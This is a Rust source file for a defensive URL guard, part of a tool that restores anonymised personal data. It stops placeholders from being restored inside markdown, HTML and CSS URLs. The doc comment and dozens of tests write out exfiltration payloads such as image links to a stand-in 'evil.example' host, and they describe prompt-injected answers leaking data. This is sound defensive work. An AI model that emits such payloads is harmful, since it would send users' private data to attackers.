//! Never restore inside URLs.
//!
//! A prompt-injected answer (or content another user wrote) can ask the
//! browser to fetch `![x](https://evil.example/?d=[NAME_1])`: restoring the
//! tag there would send the real value to that server. [`UrlGuard`] splits
//! text into parts where tags may be restored and URL parts where they stay
//! tags. It follows the syntaxes markdown renderers and browsers use:
//!
//! - CommonMark link and image destinations after `](`, and reference
//!   definitions (after any `]:`; labels may span lines, and a destination
//!   on the next line may follow block-quote `>` markers): `<…>` runs to an
//!   unescaped `>` or a line ending; a bare destination runs to ASCII space
//!   or control, or an unbalanced `)`; backslash escapes are honoured; Unicode
//!   whitespace never ends a URL.
//! - Autolinks `<scheme:…>`.
//! - Inside an HTML tag (`<` + letter … `>`), every attribute value; only
//!   TAB, LF, FF, CR and SPACE end an unquoted one, as for browsers.
//! - CSS `url(…)` and `image-set(…)` (quotes honoured, to an unquoted `)`),
//!   and what follows `@import` (to an unquoted `;`, across line breaks).
//!
//! URLs written as plain text (`https://…`, `www.…`, `key=value`) are left
//! to the engine's url-safe restore, which never restores a value after a
//! URL-like run of text; [`Guarded`] tells it about the parts it skips.
//!
//! Text arrives in pieces: every decision is made from characters already
//! seen, and a trigger always ends before the text it guards, so nothing
//! has to be held back.

use crate::jsonfrag::ValueRestorer;

/// One piece of guarded text.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Part {
    /// Inside a URL: tags here must stay tags.
    pub url: bool,
    pub text: String,
}

/// Look-behind kept for keyword triggers (`image-set(` is the longest).
const RECENT_CHARS: usize = 12;
/// Longest autolink scheme (CommonMark: 2–32 characters).
const MAX_SCHEME: u8 = 32;
/// Markdown readings followed at once; more than this protects the rest of
/// the line (a reading still waiting for its destination is kept).
const MAX_THREADS: usize = 8;

/// One markdown reading of the text (a destination or autolink that may
/// have started here).
#[derive(Debug, Clone, Copy, PartialEq, Eq, Default)]
enum Md {
    #[default]
    Free,
    /// Too many readings at once: protect to the end of the line.
    Saturated,
    /// After `](` or `]:`: ASCII whitespace before a destination; after a
    /// line ending, block-quote `>` markers too.
    DestBefore { new_line: bool },
    /// `<…>` destination.
    DestPointy { escaped: bool },
    /// Bare destination; `depth` counts open parentheses.
    DestBare { depth: u32, escaped: bool },
    /// After `<` + letter: a possible autolink scheme.
    Scheme { len: u8 },
    /// `<scheme:…>`.
    Autolink,
}

/// The HTML / CSS reading of the text.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Default)]
enum Html {
    #[default]
    Free,
    /// The tag name state.
    TagName,
    /// Before an attribute name (also after a quoted value or a `/`): a
    /// `=` here starts a name, not a value.
    BeforeAttr,
    /// An attribute name, or whitespace after one: `=` starts its value.
    AttrName,
    /// After `=` in a tag: ASCII whitespace before the value.
    ValueBefore,
    ValueQuoted(char),
    ValueBare,
    /// `url(` / `image-set(`: to an unquoted `)` at depth 0.
    CssFn {
        depth: u32,
        quote: Option<char>,
        escaped: bool,
    },
    /// After `@import`: to an unquoted `;`.
    CssImport {
        quote: Option<char>,
    },
}

/// Splits a stream of text into URL and non-URL parts. Markdown and HTML
/// are read side by side, and every place a markdown destination could
/// start is followed (a construct can turn out to be unterminated, or hide
/// another): a character is inside a URL if any reading says so.
#[derive(Debug, Default)]
pub struct UrlGuard {
    /// Markdown readings in progress (never `Free`).
    md: Vec<Md>,
    html: Html,
    /// The last characters seen, lower-cased.
    recent: String,
    prev: Option<char>,
}

fn ascii_space_or_control(c: char) -> bool {
    (c as u32) <= 0x20 || c as u32 == 0x7f
}

/// Whitespace to an HTML tokenizer: TAB, LF, FF, CR, SPACE (any other
/// control character stays inside a name or value).
fn html_space(c: char) -> bool {
    matches!(c, '\t' | '\n' | '\x0c' | '\r' | ' ')
}

fn line_ending(c: char) -> bool {
    c == '\n' || c == '\r'
}

impl UrlGuard {
    /// The parts of the next piece of text.
    pub fn split(&mut self, text: &str) -> Vec<Part> {
        let mut parts: Vec<Part> = Vec::new();
        for c in text.chars() {
            let url = self.step(c);
            match parts.last_mut() {
                Some(p) if p.url == url => p.text.push(c),
                _ => parts.push(Part {
                    url,
                    text: c.to_string(),
                }),
            }
        }
        parts
    }

    /// Is `c` part of a URL? Moves every reading on.
    fn step(&mut self, c: char) -> bool {
        let prev = self.prev;
        let mut url = false;
        let mut md: Vec<Md> = Vec::with_capacity(self.md.len() + 1);
        for state in std::mem::take(&mut self.md) {
            let (u, next) = md_step(state, c);
            url |= u;
            if next != Md::Free && !md.contains(&next) {
                md.push(next);
            }
        }
        let (html_url, html) = html_step(self.html, c);
        url |= html_url;
        self.remember(c);
        // A destination or autolink may start after `c`, whatever else is
        // going on.
        if let Some(start) = self.md_trigger(c, prev)
            && !md.contains(&start)
        {
            md.push(start);
        }
        if md.len() > MAX_THREADS {
            // Every reading but one waiting for its destination ends with
            // the line.
            md.retain(|s| matches!(s, Md::DestBefore { .. }));
            md.push(Md::Saturated);
        }
        self.md = md;
        self.html = if html == Html::Free && !html_url {
            self.html_trigger(c, prev)
        } else {
            html
        };
        url
    }

    fn remember(&mut self, c: char) {
        self.prev = Some(c);
        self.recent.extend(c.to_lowercase());
        let excess = self.recent.chars().count().saturating_sub(RECENT_CHARS);
        if excess > 0 {
            let cut = self
                .recent
                .char_indices()
                .nth(excess)
                .map_or(self.recent.len(), |(i, _)| i);
            self.recent.drain(..cut);
        }
    }

    /// Does a markdown destination or autolink start after `c`?
    fn md_trigger(&self, c: char, prev: Option<char>) -> Option<Md> {
        // Every `](` and every `]:` (reference labels may span lines):
        // guarding more is cheap.
        if (c == '(' || c == ':') && prev == Some(']') {
            Some(Md::DestBefore { new_line: false })
        } else if c.is_ascii_alphabetic() && prev == Some('<') {
            Some(Md::Scheme { len: 1 })
        } else {
            None
        }
    }

    /// Does `c` (just seen, outside any tag or CSS URL) start one?
    fn html_trigger(&self, c: char, prev: Option<char>) -> Html {
        let r = &self.recent;
        if c.is_ascii_alphabetic() && prev == Some('<') {
            Html::TagName
        } else if r.ends_with("url(") || r.ends_with("image-set(") {
            Html::CssFn {
                depth: 0,
                quote: None,
                escaped: false,
            }
        } else if r.ends_with("@import") {
            Html::CssImport { quote: None }
        } else {
            Html::Free
        }
    }
}

/// One character of the markdown reading.
fn md_step(state: Md, c: char) -> (bool, Md) {
    match state {
        Md::Free => (false, Md::Free),
        Md::Saturated => {
            if line_ending(c) {
                (false, Md::Free)
            } else {
                (true, Md::Saturated)
            }
        }
        Md::DestBefore { new_line } => {
            if ascii_space_or_control(c) {
                let new_line = new_line || line_ending(c);
                (false, Md::DestBefore { new_line })
            } else if new_line && c == '>' {
                // A block-quote marker (or a destination that starts
                // with `>`): what follows may be the destination.
                (true, Md::DestBefore { new_line })
            } else if c == '<' {
                (false, Md::DestPointy { escaped: false })
            } else {
                bare(c, 0)
            }
        }
        Md::DestPointy { escaped: true } => (true, Md::DestPointy { escaped: false }),
        Md::DestPointy { escaped: false } => match c {
            '\\' => (true, Md::DestPointy { escaped: true }),
            '>' => (false, Md::Free),
            c if line_ending(c) => (false, Md::Free),
            _ => (true, Md::DestPointy { escaped: false }),
        },
        Md::DestBare {
            depth,
            escaped: true,
        } => (
            true,
            Md::DestBare {
                depth,
                escaped: false,
            },
        ),
        Md::DestBare {
            depth,
            escaped: false,
        } => bare(c, depth),
        Md::Scheme { len } => {
            if c == ':' && len >= 2 {
                (true, Md::Autolink)
            } else if (c.is_ascii_alphanumeric() || matches!(c, '+' | '.' | '-'))
                && len < MAX_SCHEME
            {
                (false, Md::Scheme { len: len + 1 })
            } else {
                (false, Md::Free)
            }
        }
        Md::Autolink => {
            if c == '>' || c == '<' || ascii_space_or_control(c) {
                (false, Md::Free)
            } else {
                (true, Md::Autolink)
            }
        }
    }
}

/// One character of a bare destination.
fn bare(c: char, depth: u32) -> (bool, Md) {
    match c {
        '\\' => (
            true,
            Md::DestBare {
                depth,
                escaped: true,
            },
        ),
        c if ascii_space_or_control(c) => (false, Md::Free),
        '(' => (
            true,
            Md::DestBare {
                depth: depth + 1,
                escaped: false,
            },
        ),
        ')' if depth == 0 => (false, Md::Free),
        ')' => (
            true,
            Md::DestBare {
                depth: depth - 1,
                escaped: false,
            },
        ),
        _ => (
            true,
            Md::DestBare {
                depth,
                escaped: false,
            },
        ),
    }
}

/// One character of the HTML / CSS reading.
fn html_step(state: Html, c: char) -> (bool, Html) {
    match state {
        Html::Free => (false, Html::Free),
        // A `/` (self-closing start tag state) goes back to before an
        // attribute name; so does anything after a quoted value.
        Html::TagName => match c {
            '>' => (false, Html::Free),
            c if html_space(c) || c == '/' => (false, Html::BeforeAttr),
            _ => (false, Html::TagName),
        },
        Html::BeforeAttr => match c {
            '>' => (false, Html::Free),
            c if html_space(c) || c == '/' => (false, Html::BeforeAttr),
            // `=` too: it starts an attribute name.
            _ => (false, Html::AttrName),
        },
        Html::AttrName => match c {
            '>' => (false, Html::Free),
            '=' => (false, Html::ValueBefore),
            '/' => (false, Html::BeforeAttr),
            _ => (false, Html::AttrName),
        },
        Html::ValueBefore => {
            if html_space(c) {
                (false, Html::ValueBefore)
            } else if c == '"' || c == '\'' {
                (false, Html::ValueQuoted(c))
            } else if c == '>' {
                (false, Html::Free)
            } else {
                (true, Html::ValueBare)
            }
        }
        Html::ValueQuoted(q) => {
            if c == q {
                (false, Html::BeforeAttr)
            } else {
                (true, Html::ValueQuoted(q))
            }
        }
        Html::ValueBare => {
            if c == '>' {
                (false, Html::Free)
            } else if html_space(c) {
                (false, Html::BeforeAttr)
            } else {
                (true, Html::ValueBare)
            }
        }
        Html::CssFn {
            depth,
            quote,
            escaped,
        } => {
            let next = |depth, quote, escaped| Html::CssFn {
                depth,
                quote,
                escaped,
            };
            if escaped {
                (true, next(depth, quote, false))
            } else if c == '\\' {
                (true, next(depth, quote, true))
            } else if let Some(q) = quote {
                (true, next(depth, (c != q).then_some(q), false))
            } else {
                match c {
                    '"' | '\'' => (true, next(depth, Some(c), false)),
                    '(' => (true, next(depth + 1, None, false)),
                    ')' if depth == 0 => (false, Html::Free),
                    ')' => (true, next(depth - 1, None, false)),
                    _ => (true, next(depth, None, false)),
                }
            }
        }
        Html::CssImport { quote: Some(q) } => (
            true,
            Html::CssImport {
                quote: (c != q).then_some(q),
            },
        ),
        // CSS allows any whitespace (line breaks too) after `@import`.
        Html::CssImport { quote: None } => match c {
            ';' => (false, Html::Free),
            '"' | '\'' => (true, Html::CssImport { quote: Some(c) }),
            _ => (true, Html::CssImport { quote: None }),
        },
    }
}

/// A restorer that leaves URL parts alone and tells the inner restorer
/// about them (so its own URL rule sees the whole text).
pub struct Guarded<R> {
    guard: UrlGuard,
    inner: R,
}

impl<R: ValueRestorer> Guarded<R> {
    pub fn new(inner: R) -> Self {
        Guarded {
            guard: UrlGuard::default(),
            inner,
        }
    }
}

impl<R: ValueRestorer> ValueRestorer for Guarded<R> {
    fn push(&mut self, text: &str) -> String {
        let mut out = String::with_capacity(text.len());
        for part in self.guard.split(text) {
            if part.url {
                // Whatever came before the URL is decided now.
                out.push_str(&self.inner.finish());
                self.inner.skip(&part.text);
                out.push_str(&part.text);
            } else {
                out.push_str(&self.inner.push(&part.text));
            }
        }
        out
    }

    fn finish(&mut self) -> String {
        self.inner.finish()
    }

    fn pending_len(&self) -> usize {
        self.inner.pending_len()
    }

    fn skip(&mut self, text: &str) {
        let _ = self.guard.split(text);
        self.inner.skip(text);
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    /// The text with URL parts in `⟨…⟩`.
    fn marked(pieces: &[&str]) -> String {
        let mut g = UrlGuard::default();
        let mut out = String::new();
        let mut in_url = false;
        for piece in pieces {
            for part in g.split(piece) {
                if part.url != in_url {
                    out.push(if part.url { '⟨' } else { '⟩' });
                    in_url = part.url;
                }
                out.push_str(&part.text);
            }
        }
        if in_url {
            out.push('⟩');
        }
        out
    }

    /// Per character of the text fed as `pieces`: is it in a URL part?
    fn url_mask(pieces: &[&str]) -> Vec<bool> {
        let mut g = UrlGuard::default();
        let mut mask = Vec::new();
        for piece in pieces {
            for part in g.split(piece) {
                mask.extend(part.text.chars().map(|_| part.url));
            }
        }
        mask
    }

    /// What a conformance case says about one character.
    #[derive(Debug, Clone, Copy, PartialEq, Eq)]
    enum Want {
        /// Nothing (the guard may say either).
        Any,
        /// `⟨…⟩`: a conforming renderer reads it as part of a URL, so the
        /// guard must too.
        Url,
        /// `‹…›`: URL text the guard cannot know about yet (a scheme before
        /// its `:`, `www.`, an email address, which is only an address at
        /// its `@`): it decides without holding text back. By its grammar
        /// it cannot hold a `[KIND_n]` placeholder, which the check
        /// asserts.
        Unseen,
        /// `«…»`: plain text, which must stay restorable.
        Free,
    }

    /// A case: the text with what a renderer reads as URL marked.
    fn parse_case(case: &str) -> (String, Vec<Want>) {
        let mut text = String::new();
        let mut want = Vec::new();
        let mut cur = Want::Any;
        for c in case.chars() {
            match c {
                '⟨' => cur = Want::Url,
                '‹' => cur = Want::Unseen,
                '«' => cur = Want::Free,
                '⟩' | '›' | '»' => cur = Want::Any,
                _ => {
                    text.push(c);
                    want.push(cur);
                }
            }
        }
        (text, want)
    }

    /// One case, whole, split in two at every char boundary and char by
    /// char.
    fn check_case(case: &str) -> Result<(), String> {
        let (text, want) = parse_case(case);
        let whole = url_mask(&[&text]);
        let (mut missed, mut wide) = (String::new(), String::new());
        for ((c, w), url) in text.chars().zip(&want).zip(&whole) {
            match w {
                Want::Url if !url => missed.push(c),
                Want::Free if *url => wide.push(c),
                Want::Unseen if c == '[' || c == ']' => {
                    return Err(format!("{case:?}: a placeholder could hide in ‹…›"));
                }
                _ => {}
            }
        }
        if !missed.is_empty() || !wide.is_empty() {
            return Err(format!(
                "{case:?}\n    guard reads {:?}\n    not guarded: {missed:?}, guarded plain text: {wide:?}",
                marked(&[&text])
            ));
        }
        for (i, _) in text.char_indices().skip(1) {
            if url_mask(&[&text[..i], &text[i..]]) != whole {
                return Err(format!("{case:?}: split at byte {i} reads differently"));
            }
        }
        let chars: Vec<String> = text.chars().map(String::from).collect();
        let refs: Vec<&str> = chars.iter().map(String::as_str).collect();
        if url_mask(&refs) != whole {
            return Err(format!("{case:?}: char by char reads differently"));
        }
        Ok(())
    }

    fn check_cases(cases: &[&str]) {
        let failures: Vec<String> = cases.iter().filter_map(|c| check_case(c).err()).collect();
        assert!(
            failures.is_empty(),
            "{} of {} cases fail:\n{}",
            failures.len(),
            cases.len(),
            failures.join("\n")
        );
    }

    /// CommonMark 0.31.2 link destinations, escapes, entities, reference
    /// definitions and autolinks.
    #[test]
    fn conforms_to_commonmark() {
        check_cases(&[
            // §6.3 a bare destination.
            "![x](⟨//e/?d=[NAME_1]⟩) «[NAME_1]»",
            "[a](⟨//e/[NAME_1]⟩)«[NAME_1]»",
            // §6.3 balanced unescaped parentheses are part of it.
            "[a](⟨b(c(d)e)f[NAME_1]⟩) «[NAME_1]»",
            "[a](⟨(([NAME_1]))⟩)",
            // §6.3 + §2.4 an escaped parenthesis is not counted.
            "[a](⟨b\\)c[NAME_1]⟩)",
            "[a](⟨b\\(c[NAME_1]⟩) «[NAME_1]»",
            // §2.4 a backslash before anything but ASCII punctuation is a
            // backslash.
            "[a](⟨//e/\\d[NAME_1]⟩)",
            "[a](⟨https:\\\\e\\[NAME_1]⟩)",
            // §6.3 spaces, tabs and up to one line ending before it.
            "[a](\n⟨//e/[NAME_1]⟩)",
            "[a]( \t\r\n ⟨//e/[NAME_1]⟩ \"t\")",
            "[a](\r⟨//e/[NAME_1]⟩)",
            // §6.3 a title is not part of the destination.
            "[a](⟨//e/[NAME_1]⟩ 't')",
            "[a](⟨//e/[NAME_1]⟩\n(t))",
            // §6.3 a pointy destination holds spaces and parentheses and
            // ends at an unescaped `>`.
            "[a](<⟨b)c ( [NAME_1]⟩>) «[NAME_1]»",
            "[a](<⟨b\\>c [NAME_1]⟩>)",
            "![a](<⟨//e/\\\\[NAME_1]⟩>)",
            // §6.3 only ASCII control characters and space end a bare
            // destination (§2.1: Unicode whitespace is not among them).
            "[a](⟨//e/\u{a0}[NAME_1]⟩)",
            "[a](⟨//e/\u{85}[NAME_1]⟩)",
            "[a](⟨//e/\u{2028}[NAME_1]⟩)",
            "[a](⟨//e/\u{3000}[NAME_1]⟩)",
            "[a](⟨//e/\u{feff}[NAME_1]⟩)",
            // §2.5 entity and numeric character references are not syntax.
            "[a](⟨//e/&#41;[NAME_1]⟩)",
            "[a](⟨//e/&#x29;&#32;[NAME_1]⟩)",
            "[a](<⟨//e/&gt;[NAME_1]⟩>)",
            "[a](⟨//e/?a=1&amp;b=[NAME_1]⟩)",
            // §6.3 link text may hold brackets, code and images (§6.4).
            "[a [b] `c`](⟨//e/[NAME_1]⟩)",
            "[`](`](⟨//e/[NAME_1]⟩)",
            "[![i](⟨//e/[NAME_1]⟩)](⟨//f/[EMAIL_1]⟩)",
            // §4.7 link reference definitions.
            "[r]: ⟨//e/[NAME_1]⟩\n\n![x][r] «[NAME_1]»",
            "[r]:⟨//e/[NAME_1]⟩",
            "[r]:\n⟨//e/[NAME_1]⟩",
            "[r]:\r\n   ⟨//e/[NAME_1]⟩ 'title'",
            "[r]: <⟨//e/ [NAME_1]⟩>",
            "   [r]: ⟨//e/[NAME_1]⟩",
            "[a]: ⟨//e/1⟩\n[b]: ⟨//e/[NAME_1]⟩",
            "[r\\]x]: ⟨//e/[NAME_1]⟩",
            // §4.7 a label may span lines; §2.1 a line ending is LF, CR or
            // CRLF.
            "[r\nx]: ⟨//e/[NAME_1]⟩\n\n![a][r x]",
            "[r\r\nx]:\r\n⟨//e/[NAME_1]⟩",
            "[r\rx]:\r⟨//e/[NAME_1]⟩\r\r![a][r x]",
            // §5.1 definitions in block quotes: the destination may follow
            // on the next line, after its `>` markers.
            "> [r]: ⟨//e/[NAME_1]⟩",
            "> [r]:\n> ⟨//e/[NAME_1]⟩",
            ">[r]:\n>⟨//e/[NAME_1]⟩",
            "> > [r]:\n> > ⟨//e/[NAME_1]⟩",
            "   > [r]:\n   > ⟨//e/[NAME_1]⟩",
            "> [r]:\r> ⟨//e/[NAME_1]⟩",
            "> [r]:\r\n>\t⟨//e/[NAME_1]⟩",
            "> [r\n> x]: ⟨//e/[NAME_1]⟩",
            "> [a](\n> ⟨//e/[NAME_1]⟩)",
            // §5.1 a lazy continuation line.
            "> [r]:\n⟨//e/[NAME_1]⟩",
            // §5.2 definitions in list items.
            "- [r]: ⟨//e/[NAME_1]⟩",
            "1) [r]: ⟨//e/[NAME_1]⟩",
            "1. [r]:\n   ⟨//e/[NAME_1]⟩",
            "* [r]:\n\t⟨//e/[NAME_1]⟩",
            "> 1. [r]:\n>    ⟨//e/[NAME_1]⟩",
            "- > [r]:\n  > ⟨//e/[NAME_1]⟩",
            // §6.5 URI autolinks: a scheme of 2 to 32 characters, then
            // anything but ASCII control, space, `<` and `>`.
            "<‹http›⟨:e/?d=[NAME_1]⟩> «[NAME_1]»",
            "<‹a+b.c-d›⟨:[NAME_1]⟩>",
            "<‹abcdefghijabcdefghijabcdefghijab›⟨:[NAME_1]⟩>",
            "<‹MAILTO›⟨:[NAME_1]⟩>",
            // §6.5 backslash escapes do not work inside autolinks.
            "<‹http›⟨://e/\\[NAME_1]⟩>",
            "<‹http›⟨://e/(\u{a0}[NAME_1]⟩>",
            // §6.5 email autolinks (no placeholder fits their grammar).
            "<‹a.b+c@e.example›> «[NAME_1]»",
        ]);
    }

    /// GFM 0.29 §6.9 extended autolinks.
    #[test]
    fn conforms_to_gfm_autolinks() {
        check_cases(&[
            // `www.`, then a domain, then a path to whitespace or `<`.
            "‹www.›⟨e.example/?d=[NAME_1]⟩ «[NAME_1]»",
            "see ‹WWW.›⟨e.example/[NAME_1]⟩",
            "(‹www.›⟨e.example/[NAME_1]⟩)",
            "*‹www.›⟨e.example/a?b=[NAME_1]&c=d⟩*",
            // cmark-gfm ends the path only at ASCII whitespace or `<`.
            "‹www.›⟨e.example/?d=\u{a0}[NAME_1]⟩",
            // `http://` and `https://`.
            "‹http://›⟨e.example/?d=[NAME_1]⟩ «[NAME_1]»",
            "go to ‹HTTPS://›⟨e.example/[NAME_1]⟩.",
            "‹https://›⟨e.example/?d=\u{3000}[NAME_1]⟩",
            "(‹https://›⟨e.example/(a)[NAME_1]⟩)",
            // A literal URL inside a link destination is one URL.
            "[a](⟨https://e.example/[NAME_1]⟩)",
            // Email addresses, and the `mailto:` / `xmpp:` protocols.
            "mail ‹a.b-c_d+e@e.example›. «[NAME_1]»",
            "‹mailto:a@e.example›",
            "‹xmpp:a@e.example/r@x.y›",
        ]);
    }

    /// The WHATWG HTML tokenizer (§13.2.5): attribute values, comments,
    /// CDATA and the places a tag cannot start.
    #[test]
    fn conforms_to_html_tokenizer() {
        check_cases(&[
            // Attribute value (double-quoted) / (single-quoted) /
            // (unquoted) states.
            "<img src=\"⟨//e/?d=[NAME_1]⟩\"> «[NAME_1]»",
            "<img src='⟨//e/?d=\" [NAME_1]⟩'>",
            "<img src=⟨//e/[NAME_1]⟩> «[NAME_1]»",
            // Unquoted: only TAB, LF, FF, CR, SPACE and `>` end it.
            "<img src=⟨//e/?d=\u{b}[NAME_1]⟩>",
            "<img src=⟨//e/\"'<=`[NAME_1]⟩ alt=x>",
            "<img src=⟨//e/\u{a0}[NAME_1]⟩>",
            // Before attribute value: whitespace, line endings too.
            "<img src =\n\t\"⟨//e/[NAME_1]⟩\">",
            "<img\nsrc\n=\n⟨//e/[NAME_1]⟩>",
            "<IMG SRC=⟨//e/[NAME_1]⟩>",
            "<img\u{c}src=⟨//e/[NAME_1]⟩>",
            // Self-closing start tag state: `/` between attributes.
            "<img/src=⟨//e/[NAME_1]⟩>",
            "<img/ /src='⟨//e/[NAME_1]⟩'/>",
            // After attribute value (quoted): no whitespace needed.
            "<img alt=\"x\"src=\"⟨//e/[NAME_1]⟩\">",
            // Before attribute name: a `=` here starts a name, not a value.
            "<img =\"x src=\"⟨//e/[NAME_1]⟩\">",
            "<img alt=\"a\"=\"x src=\"⟨//e/[NAME_1]⟩\">",
            "<img/=\"x src=\"⟨//e/[NAME_1]⟩\">",
            "<img alt=a =\"x src=\"⟨//e/[NAME_1]⟩\">",
            // Attribute name state: quotes and `<` belong to the name.
            "<img a\"b=⟨//e/[NAME_1]⟩>",
            "<img a'b'c src='⟨//e/[NAME_1]⟩'>",
            "<img x<y src=⟨//e/[NAME_1]⟩>",
            // Character references do not end a value.
            "<img src=⟨//e/&#32;[NAME_1]⟩>",
            "<img src=\"⟨//e/&quot;[NAME_1]⟩\">",
            // URL attributes: srcset, style, meta content, ping,
            // formaction, poster, background, base href, srcdoc, ...
            "<img srcset=\"⟨//e/a.png 1x, //e/[NAME_1].png 2x⟩\">",
            "<img srcset=⟨//e/a.png,//e/[NAME_1].png⟩ sizes=1px>",
            "<picture><source srcset='⟨//e/[NAME_1] 2x⟩'></picture>",
            "<div style=\"background:url(⟨//e/[NAME_1]⟩)\">x</div>",
            "<div style=background:url(⟨//e/[NAME_1]⟩)>x</div>",
            "<p style=\"background:url(&quot;⟨//e/[NAME_1]⟩&quot;)\">",
            "<meta http-equiv=refresh content='0; url=⟨//e/[NAME_1]⟩'>",
            "<meta http-equiv=refresh content=0;url=⟨//e/[NAME_1]⟩>",
            "<a href=\"#\" ping=\"⟨//e/[NAME_1] //f/[EMAIL_1]⟩\">x</a>",
            "<button formaction=⟨//e/[NAME_1]⟩>x</button>",
            "<video poster=\"⟨//e/[NAME_1].png⟩\"></video>",
            "<body background=⟨//e/[NAME_1].png⟩>",
            "<table background='⟨//e/[NAME_1]⟩'>",
            "<base href=\"⟨//e/[NAME_1]/⟩\"><img src=⟨x.png⟩>",
            "<svg><image href=⟨//e/[NAME_1]⟩ /></svg>",
            "<svg><use xlink:href='⟨//e/[NAME_1]#a⟩'/></svg>",
            "<object data=⟨//e/[NAME_1]⟩></object>",
            "<link rel=stylesheet href=⟨//e/[NAME_1].css⟩>",
            "<form action=⟨//e/[NAME_1]⟩></form>",
            "<iframe srcdoc=\"<img src=⟨//f/[EMAIL_1]⟩>\"></iframe>",
            "<iframe srcdoc=\"&lt;img src=⟨//f/[EMAIL_1]⟩&gt;\"></iframe>",
            // Comment states: a comment is not markup and ends at `-->`,
            // `--!>`, `<!-->` or `<!--->`; a tag after it is a tag.
            "<!-- <a title=\" --><img src=\"⟨//e/[NAME_1]⟩\">",
            "<!-- <a title=' --!><img src='⟨//e/[NAME_1]⟩'>",
            "<!--><a title=\"<img src=\"⟨//e/[NAME_1]⟩\">",
            "<!---><img src='⟨//e/[NAME_1]⟩'>",
            // Bogus comment state: `<?`, `<!` + other, `</` + non-letter.
            "<? <a title=\"?><img src=\"⟨//e/[NAME_1]⟩\">",
            "<!x <a title=\"><img src=\"⟨//e/[NAME_1]⟩\">",
            "</1 <a title=\"><img src=\"⟨//e/[NAME_1]⟩\">",
            "<!DOCTYPE html \"<a title='\"><img src='⟨//e/[NAME_1]⟩'>",
            // CDATA: a bogus comment to the first `>` in HTML content, a
            // CDATA section to `]]>` in foreign content.
            "<![CDATA[ <a title=\" ]]><img src=\"⟨//e/[NAME_1]⟩\">",
            "<svg><![CDATA[ > <a title=\" ]]><image href=\"⟨//e/[NAME_1]⟩\"/></svg>",
            // End tag: its attributes are dropped, but it reads quotes.
            "</x title=\"<img src=\"><img src=\"⟨//e/[NAME_1]⟩\">",
            // RCDATA (`textarea`, `title`): no tags until the end tag.
            "<textarea><a title=\"</textarea><img src=\"⟨//e/[NAME_1]⟩\">",
            "<title>'</title><img alt='x' src=⟨//e/[NAME_1]⟩>",
            // Markdown text that is not HTML (code span, escape).
            "`<a title=\"` <img src=\"⟨//e/[NAME_1]⟩\">",
            "\\<a title=\" <img src=\"⟨//e/[NAME_1]⟩\">",
            "[a](/u \"<a title='\") <img src='⟨//e/[NAME_1]⟩'>",
            // Plain text after tags stays plain.
            "<b>«[NAME_1]»</b> «[NAME_1]»",
        ]);
    }

    /// CSS Syntax 3 url tokens and the functions and rules that take URLs.
    #[test]
    fn conforms_to_css_syntax() {
        check_cases(&[
            // §4.3.6 consume a url token.
            "<style>p{background:url(⟨//e/[NAME_1]⟩)}</style> «[NAME_1]»",
            "<style>p{background:URL(⟨//e/[NAME_1]⟩)}</style>",
            "<style>p{background:url(\n ⟨//e/[NAME_1]⟩ )}</style>",
            // §4.3.7 an escaped `)` stays in the url.
            "<style>p{background:url(⟨//e/\\)[NAME_1]⟩)}</style>",
            // §4.3.4 `url(` + quote: a function holding a string token.
            "<style>p{background:url(\"⟨//e/)[NAME_1]⟩\")}</style>",
            "<style>p{background:url('⟨//e/\\'[NAME_1]⟩')}</style>",
            // §4.3.5 an escaped newline continues a string.
            "<style>p{background:url(\"⟨//e/\\\n[NAME_1]⟩\")}</style>",
            // §4.3.4 the name is compared after escapes are consumed
            // (§4.3.7): `u\72l(` is `url(`.
            "<style>p{background:u\\72l(⟨//e/[NAME_1]⟩)}</style>",
            "<style>p{background:u\\72 l(⟨//e/[NAME_1]⟩)}</style>",
            "<style>p{background:\\75\\72\\6c(⟨//e/[NAME_1]⟩)}</style>",
            "<style>p{background:\\url(⟨//e/[NAME_1]⟩)}</style>",
            "<style>p{background:u\\R\\L(⟨//e/[NAME_1]⟩)}</style>",
            // CSS Images 4 image-set(): strings are URLs too.
            "<style>p{background:image-set(\"⟨//e/[NAME_1]⟩\" 1x, url(⟨//f/[EMAIL_1]⟩) 2x)}</style>",
            "<style>p{background:-webkit-image-set('⟨//e/[NAME_1]⟩' 1x)}</style>",
            "<style>p{background:image-s\\65t(\"⟨//e/[NAME_1]⟩\" 1x)}</style>",
            // CSS Cascade 5 §2 @import: a string or url, then conditions.
            "<style>@import \"⟨//e/[NAME_1]⟩\";</style> «[NAME_1]»",
            "<style>@IMPORT\n'⟨//e/[NAME_1]⟩';</style>",
            "<style>@import url(\"⟨//e/[NAME_1]⟩\") layer(x) screen;</style>",
            // A `;` inside a url token or string does not end @import.
            "<style>@import url(⟨//e/;[NAME_1]⟩);</style>",
            "<style>@import '⟨//e/\\';[NAME_1]⟩';</style>",
            // §4.3.11 an at-keyword's name is compared after escapes.
            "<style>@\\69mport '⟨//e/[NAME_1]⟩';</style>",
            "<style>@\\69 mport\"⟨//e/;[NAME_1]⟩\";</style>",
            "<style>@font-face{src:url(⟨//e/[NAME_1].woff⟩)}</style>",
            // A url reading started in other text does not hide the next
            // one.
            "<style>a[title=\"<b x='\"]{background:url('⟨//e/[NAME_1]⟩')}</style>",
            "`url('` <style>p{background:url(\"⟨//e/')[NAME_1]⟩\")}</style>",
            "`@import '` <style>@import \"⟨//e/';[NAME_1]⟩\";</style>",
        ]);
    }

    /// WHATWG URL: characters the URL parser maps (UTS #46 in hosts) or
    /// drops may sit inside a destination or value; none of them ends it.
    #[test]
    fn conforms_to_whatwg_url() {
        check_cases(&[
            "[a](⟨https：／／e∕[NAME_1]⟩)",
            "![a](⟨//e．example／?d=[NAME_1]⟩)",
            "[a](⟨//e/）[NAME_1]⟩)",
            "[r]: ⟨http:／／e∕[NAME_1]⟩",
            "<‹http›⟨:／／e∕[NAME_1]⟩>",
            "<img src=\"⟨https：//e/[NAME_1]⟩\">",
            "<img src=⟨／／e/[NAME_1]⟩>",
            "<img src=⟨\u{2215}\u{2215}e/[NAME_1]⟩>",
            // The parser removes ASCII tab and newline anywhere in a URL.
            "<img src=\"⟨//e/?d=\n[NAME_1]⟩\">",
            "<img src='⟨//e/?d=\t[NAME_1]⟩'>",
            "<style>p{background:url(⟨//e／[NAME_1]⟩)}</style>",
        ]);
    }

    /// Does feeding `case` (markers removed) saturate the markdown
    /// readings?
    fn saturates(case: &str) -> bool {
        let (text, _) = parse_case(case);
        let mut g = UrlGuard::default();
        text.chars().any(|c| {
            g.split(&c.to_string());
            g.md.contains(&Md::Saturated)
        })
    }

